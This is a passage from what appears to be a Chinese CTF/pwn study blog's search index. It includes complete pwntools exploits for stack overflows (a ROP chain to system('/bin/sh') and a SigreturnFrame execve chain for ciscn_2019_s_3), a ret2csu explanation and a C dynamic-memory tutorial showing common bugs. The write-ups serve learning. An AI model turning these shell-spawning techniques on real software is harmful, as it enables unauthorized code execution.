class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">rdi = base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)))</span><br><span class="line">ret = <span class="number">0x401493</span></span><br><span class="line">pl3 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(rdi) + p64(binsh) + p64(sys)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name &gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content &gt;&gt;&#x27;</span>)</span><br><span class="line">io.send(pl3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2srop</title>
    <url>/2025/12/15/ret2srop/</url>
    <content><![CDATA[<h1 id="ret2srop"><a href="#ret2srop" class="headerlink" title="ret2srop"></a>ret2srop</h1><h4 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h4><p>srop在wiki里归类为高阶rop。</p>
<p>首先需要了解什么是srop。</p>
<p><code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p>
<h2 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h2><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
<p><img src="/images/srop1.png" alt="signal"></p>
<ol>
<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>
<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的。**之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li>
<li>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</li>
</ol>
<p>这里就不过多赘述了，给出链接。</p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki</a></p>
<p><img src="/images/srop2.png" alt="ida"></p>
<p>可以看出，这里系统调用read和write函数。同时0xf是sigreturn的调用号，所以我们可以尝试srop。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(elf.sym.vuln)<span class="comment">#这里不是0x18的原因是，汇编中直接ret，而没有leave，所以直接写入vuln地址就行了</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">rsp = stack -  <span class="number">0x118</span></span><br><span class="line">gadget = <span class="number">0x4004da</span> <span class="comment">#mov rax,0xf</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">sigFrame = SigreturnFrame() </span><br><span class="line">sigFrame.rax =<span class="number">59</span></span><br><span class="line">sigFrame.rdi = rsp</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall_ret</span><br><span class="line">pl2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(gadget) + p64(syscall_ret) + <span class="built_in">bytes</span>(sigFrame)</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>解释一下exp。</p>
<p>这里因为调用了write函数，而且写出的是我们输入的位置的地址。进入gdb动调看下write会写出什么。</p>
<p><img src="/images/srop3.png" alt="gdb"></p>
<p>可以看出，在0x7fffffffde60的位置，放着栈上的地址。（0x7fffffffde50上存放的地址会被我们填充的数据覆盖，所以选择接受de60处的。）由于ASLR机制的存在，所以我们无法得出准确的地址，但是偏移量是不变的。所以此时的偏移就是distance 0x00007fffffffdf58 0x7fffffffde40 ; offset &#x3D; 0x118。（这里建议换下环境，不然偏移可能不同。由于版本是ubuntu18，所以这里用的是  libc-2.27.so   2.27-3ubuntu1_amd64）</p>
<p>所以我们写入的地址就是我们接收的的地址再减去0x118。后面就是srop的书写格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sigFrame = SigreturnFrame() </span><br><span class="line">sigFrame.rax =<span class="number">59</span> <span class="comment">#设置rax的值为59，是execve的系统调用号</span></span><br><span class="line">sigFrame.rdi = rsp <span class="comment">#这里是将我们写入的栈地址作为一参传入</span></span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span> <span class="comment">#execve(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">sigFrame.rip = syscall_ret <span class="comment">#调用sigFrame</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2csu</title>
    <url>/2025/11/21/ret2csu/</url>
    <content><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>将附件丢进ida</p>
<p><img src="/images/ret2csu-(1).png" alt="ida"></p>
<p>可以看到，程序中不存在任何后门函数。但是附件又给了libc.so.6，所以我们可以通过write函数，将write或者read的地址进行泄露，从而达到ret2libc的做法。</p>
<p>于是我们需要控制write的执行流。可以看出write有三个参数：fd，buf，len。在x86-64架构下，前六个参数依次存在rdi，rsi，rdx，rcx，r8，r9。所以我们只要做到rsi &#x3D; 1；rdi &#x3D; write_got；len&gt;&#x3D;8就可以了。</p>
<p>__libc_csu_init进行初始化时有这么一串汇编指令：</p>
<p><img src="/images/ret2csu-(2).png" alt="ida"></p>
<p>如果我们把上半部分成为gadget2，下半部分gadget1。那么在gadget1中可以看出我们可以轻松控制pop到各个寄存器的值，再结合gadget2，可以看出控制r12间接控制rdi–fd（这里r12d是指取rdi的低四字节的值，因为是控制fd所以不影响）；控制r13间接控制rsi–write_got；控制r14间接控制rdx–len。所以我们需要在vuln中进行栈溢出，控制程序执行到gadget1的位置，然后精心构造各个寄存器的值，进行我们需要的充满特定参数的函数。</p>
<p><img src="/images/ret2csu-(3).png" alt="exp"></p>
<p>可以看到exp中还控制了rbx和rbp的值，这是为什么呢？</p>
<p><img src="/images/ret2csu-(4).png" alt="ida"></p>
<p>后面就是和ret2libc一样的做法了，就不多赘述了。</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>动态内存分配</title>
    <url>/2025/12/19/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/</url>
    <content><![CDATA[<h1 id="1-malloc"><a href="#1-malloc" class="headerlink" title="1.malloc"></a>1.malloc</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">malloc</span> <span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p>向内存申请一块连续可用的空间，并返回指向这块空间的指针。</p>
<p>如果返回成功，则返回一个指向开辟好空间的指针。</p>
<p>如果开辟失败，则返回一个<code>NULL</code>指针，因此malloc的返回值一定要做检查。</p>
<p>返回值的类型是<code>void*</code>，所以malloc函数并不知道开辟空间的类型，具体使用情况由使用者决定。</p>
<p>如果参数<code>size</code>为0，malloc的行为是标准是未定义的，取决于编译器。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">20</span>);<span class="comment">//由于malloc的返回值是void*，所以这里强制类型转化为我们所需要的。</span></span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc&quot;</span>);<span class="comment">//用于错误处理的库函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//使用空间</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(p + i) = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="2-free"><a href="#2-free" class="headerlink" title="2.free"></a>2.free</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span> <span class="params">(<span class="type">void</span>* ptr)</span>;</span><br></pre></td></tr></table></figure>

<p>专门用来做动态内存的释放和回收。</p>
<p>如果参数<code>ptr</code>指向的空间不是动态开辟的，那free函数的行为是未定义的。</p>
<p>如果<code>ptr</code>是NULL指针，则函数什么事都不做。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p);<span class="comment">//传递的是要释放内存空间的起始地址。释放完p指针后，p为野指针。</span></span><br><span class="line">p = <span class="literal">NULL</span>;<span class="comment">//避免成为野指针。</span></span><br></pre></td></tr></table></figure>



<h1 id="3-calloc"><a href="#3-calloc" class="headerlink" title="3.calloc"></a>3.calloc</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">calloc</span> <span class="params">(<span class="type">size_t</span> num, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p>函数的功能是<code>num</code>个大小为<code>size</code>的元素开辟一块空间，并且把空间的内个字节初始化为0。</p>
<p>与函数<code>malloc</code>的区别在于<code>calloc</code>会在返回地址之前把申请的空间的每个字节初始化为全0。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">calloc</span>(<span class="number">5</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure>



<h1 id="4-realloc"><a href="#4-realloc" class="headerlink" title="4.realloc"></a>4.realloc</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">realloc</span> <span class="params">(<span class="type">void</span>* ptr, <span class="type">size_t</span> size)</span></span><br></pre></td></tr></table></figure>

<p>realloc函数的出现让动态内存管理更加灵活。</p>
<p>为了合理的使用内存，我们对内存的大小做灵活的调整。那<code>realloc</code>函数就可以做到对动态开辟内存大小的调整。</p>
<p><code>ptr</code>是要调整的内存地址。</p>
<p><code>size</code>调整之后新的大小。</p>
<p>返回值为调整之后的内存起始位置。</p>
<p>如果调整失败，返回的是空指针NULL。</p>
<p>这个函数再调整原内存空间大小的基础上，还会将原来内存中的数据移动到新的空间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="built_in">realloc</span>(p,<span class="number">40</span>)；</span><br></pre></td></tr></table></figure>

<p><img src="/images/malloc1.png"></p>
<p>在情况2下：</p>
<p>1.在堆区的内存中找一个新的空间，并且满足新的大小要求</p>
<p>2.会将原来空间的数据拷贝一份到新的空间。</p>
<p>3.释放旧的空间。</p>
<p>4.返回新的内存空间的起始地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">realloc</span>(<span class="literal">NULL</span>,<span class="number">20</span>) = <span class="built_in">malloc</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure>



<h1 id="5-常见的动态内存的错误"><a href="#5-常见的动态内存的错误" class="headerlink" title="5.常见的动态内存的错误"></a>5.常见的动态内存的错误</h1><h2 id="5-1对NULL指针的解引用操作"><a href="#5-1对NULL指针的解引用操作" class="headerlink" title="5.1对NULL指针的解引用操作"></a>5.1对NULL指针的解引用操作</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">    *p = <span class="number">20</span>;<span class="comment">//为对返回值经行判断是否为NULL。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-2对动态开辟空间的越界访问"><a href="#5-2对动态开辟空间的越界访问" class="headerlink" title="5.2对动态开辟空间的越界访问"></a>5.2对动态开辟空间的越界访问</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(p+i) = i;<span class="comment">//当i是10的时候就越界访问。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    p = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-3对非动态开辟的内存使用free释放"><a href="#5-3对非动态开辟的内存使用free释放" class="headerlink" title="5.3对非动态开辟的内存使用free释放"></a>5.3对非动态开辟的内存使用free释放</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;<span class="comment">//局部变量，在栈上。</span></span><br><span class="line">    <span class="type">int</span>* p = &amp;a;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-4使用free释放一块动态开辟内存的一部分"><a href="#5-4使用free释放一块动态开辟内存的一部分" class="headerlink" title="5.4使用free释放一块动态开辟内存的一部分"></a>5.4使用free释放一块动态开辟内存的一部分</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *p = i+<span class="number">1</span>;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);<span class="comment">//此时p指向的位置不是动态开辟空间的起始地址。</span></span><br><span class="line">    p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-5对同一块动态内存多次释放"><a href="#5-5对同一块动态内存多次释放" class="headerlink" title="5.5对同一块动态内存多次释放"></a>5.5对同一块动态内存多次释放</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);<span class="comment">//记得要p = NULL;</span></span><br><span class="line">    <span class="built_in">free</span>(p);<span class="comment">//重复释放</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-6动态开辟内存忘记释放-（内存泄漏）"><a href="#5-6动态开辟内存忘记释放-（内存泄漏）" class="headerlink" title="5.6动态开辟内存忘记释放 （内存泄漏）"></a>5.6动态开辟内存忘记释放 （内存泄漏）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *p = <span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有使用free来释放，当程序运行结束的时候，也会由操作系统回收的！</p>
<p>尽量要做到：</p>
<p>1.谁（函数等）申请的空间谁释放。（malloc和free要成对出现）</p>
<p>2.如果不能释放，要告诉使用的人，记得释放。</p>
]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
</search>
